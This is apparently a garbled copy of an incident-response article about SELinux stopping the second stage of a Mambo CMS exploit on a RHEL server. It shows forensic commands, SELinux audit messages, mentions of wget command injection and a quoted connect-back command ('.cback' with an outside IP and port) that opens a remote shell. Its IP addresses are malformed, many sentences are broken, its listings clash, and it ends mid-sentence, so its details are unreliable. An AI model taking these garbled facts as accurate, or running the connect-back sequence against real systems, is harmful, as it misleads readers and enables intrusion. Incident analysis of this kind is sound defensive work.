    \n# # Mambo Exploit Blocked\nby SELinux\n\nA real-world case where SELinux proved\
    \ its worth. RICHARDINGTON-MCGUIRE\n\n**If you operate** Internet-connected servers,\
    \ chances are you will eventually have with a successful attack. Last year, I\
    \ discovered despite the multilayered defenses in place on a Test web (target),\
    \ an attacker managed to execute an exploit in a partially successful attempt\
    \ to gain access. This server was running Red Hat Enterprise Linux (RHEL) and\
    \ Mambo context matters. It had several defenses in place, including Security-Enhanced\
    \ Linux (SELinux). SELinux prevented the attacker from executing the second stage\
    \ of the attack, possibly preventing a compromise. This article presents a case\
    \ study of intrusion, explaining how the intrusion works, what I took to identify\
    \ the exploit, how I recovered from the attack and what I learned securing my\
    \ system. I changed machine names and IP addresses for privacy reasons.\n\nComputers\
    \ invaded in:\n- 192.168.166.155—running RHEL 4\n- 10.9.233.25—worm source\n-\
    \ 172.126.31.57—Web server payload\n- 200.238.39—target of stage 2 executable\n\
    \n## Defending Your System\n\nToday, modern system defend with a layered security\
    \ approach, using firewalls, automated system management tools, logs analysis\
    \ and recently, SELinux provides additional control beyond those traditional policy.\
    \ It is also possible to restrict the privileges of users to the minimum they\
    \ require for correct operation. This can blunt an attack that depends on having\
    \ read, write or execute access to files.\n\n## Discovering the Incident\n\nAt\
    \ approximately 8:00 AM on May 6, 2006, I noticed an SELinux enforcement message\
    \ in mail/log:\n\n```\nname=\"exploit\" dev=dm_0 ino=852100\ncontext=user:system_r:httpd_script_t\n\
    context=user:object_r:httpd_script_rw_t\nclass=file\n```\n\nI used to identify\
    \ this back quickly:\n\n```\n# locate cback\n/usr/share/pixmaps/gnome-cc.png\n\
    /usr/lib/libback.so.0.0\n/usr/lib/libback.so.0\n```\n\nThe command revealed the\
    \ executable file type:\n\n```\n# file /tmp/cback\nELF 32-bit LSB executable,\
    \ for GNU/Linux 2.2.0, dynamically linked (shared libs), not stripped\n```\n\n\
    The user owned that file, but it had a few days after the initial installation\
    \ on target:\n\n```\nls -l /tmp\n-rw-r-- 1 root root 852100 user:object_r:httpd_script_rw_t\n\
    -rw-xr-x 1 root root 138091 Feb 15 2005 0 cback\n```\n\nThis confirmed the identity\
    \ of the file in the audit message, because I had not found the file, I would\
    \ have used to find the identity by inode:\n\n```\n# find -inum 852100 2>/dev/null\n\
    /tmp/cback\n```\n\n## Analyzing the Exploit for Clues\n\nGiven the name of the\
    \ script, it might have been identified as callback script. Because the user owned\
    \ the file, I checked the Web server logs for evidence. Because the attack payload\
    \ was in /tmp, I saved a copy of it for posterity:\n\n```\n# cp -a cback /root\n\
    May 4 05:37:22 target cback: audit:(116743456.0:2277): avc: denied (execute_no)\
    \ for pid=9401 comm=\"sh\"\n```\n\nThe attack seemed to demolish with sockets,\
    \ judging from the strings within (Listing 1). The Web server log had many suspicious\
    \ requests, attacking Mambo using command injection and wget, attacking other\
    \ CMS systems. I copied all the login content php or wget with ip address under\
    \ the control of the attacker. The log file did contain useful clues; it confirmed\
    \ that the binary was related to a request made to Mambo. Furthermore, query string\
    \ showed that the attacker used wget, a command line to retrieve the password\
    \ file. The Web server attempted to execute the cback executable with an IP address\
    \ of 100.238.39 presumably another attack. The attack attempted to execute this\
    \ sequence of commands:\n\n```\n.cback 100.238.39 8000\necho YYY\necho HTTP/1.1\n\
    ```\n\nGoing back to Var/log, I searched for further suspicious SELinux enforcement\
    \ measures. Listing 3 contains the lines that matched the time of the Web server\
    \ attacks. This appeared to be a beware, we pkinet.com (on a different machine,\
    \ but the same subnet) also had requests from 0.923.25 at the same time as before.\
    \ Listing 4 Lines showing further attackers similar to the stock wget, mlircp,\
    \ php and phpgroup appeared in the logs. The worm made requests to the default\
    \ virtual host, so it's likely that the worm was not using the host header its\
